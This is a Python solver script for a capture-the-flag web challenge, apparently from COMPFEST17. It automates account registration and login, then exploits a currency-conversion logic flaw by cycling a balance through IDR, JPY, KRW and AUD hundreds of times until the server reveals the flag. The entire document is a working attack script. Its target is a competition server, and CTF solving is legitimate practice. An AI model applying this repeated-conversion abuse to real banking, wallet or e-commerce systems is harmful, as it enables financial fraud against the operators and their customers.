import requests
import time

BASE_URL = "http://ctf.compfest.id:7303"

def exploit():
    # Generate random username
    username = f"exploit_{int(time.time())}"
    password = "password123"
    
    # Create session
    s = requests.Session()
    
    # 1. Register account
    print(f"[*] Registering account {username}...")
    resp = s.post(f"{BASE_URL}/register", data={
        "username": username,
        "password": password,
        "confirm_password": password
    }, allow_redirects=False)
    
    if resp.status_code != 302:
        print("[-] Registration failed!")
        print(resp.text)
        return
    
    # 2. Login
    print("[*] Logging in...")
    resp = s.post(f"{BASE_URL}/login", data={
        "username": username,
        "password": password
    }, allow_redirects=False)
    
    if resp.status_code != 302:
        print("[-] Login failed!")
        return
    
    print("[+] Successfully logged in!")
    
    # 3. Perform enhanced currency conversion exploit
    print("[*] Starting aggressive currency conversion exploit...")
    currencies = ["IDR", "JPY", "KRW", "AUD"]  # Most profitable conversion path
    iterations = 300  # Increased from 100 to 300
    
    for i in range(1, iterations + 1):
        for currency in currencies:
            s.post(f"{BASE_URL}/change-currency", 
                  data={"currency": currency},
                  headers={"Referer": f"{BASE_URL}/change-currency"})
            
        # Check balance every 20 iterations
        if i % 20 == 0:
            print(f"[*] Completed {i} iterations...")
            resp = s.get(f"{BASE_URL}/are-you-rich")
            if "YES YOU ARE" in resp.text:
                # Extract flag
                flag_start = resp.text.find("COMPFEST17{")
                flag_end = resp.text.find("}", flag_start)
                flag = resp.text[flag_start:flag_end+1]
                print(f"[+] FLAG FOUND: {flag}")
                return
    
    # Final check
    print("[*] Final balance check...")
    resp = s.get(f"{BASE_URL}/are-you-rich")
    if "YES YOU ARE" in resp.text:
        flag_start = resp.text.find("COMPFEST17{")
        flag_end = resp.text.find("}", flag_start)
        flag = resp.text[flag_start:flag_end+1]
        print(f"[+] FLAG FOUND: {flag}")
    else:
        print("[-] Exploit failed - balance not high enough")
        print("[!] Possible solutions:")
        print("    1. Try running the script again")
        print("    2. Increase iterations further")
        print("    3. Try different currency combinations")

if __name__ == "__main__":
    exploit()
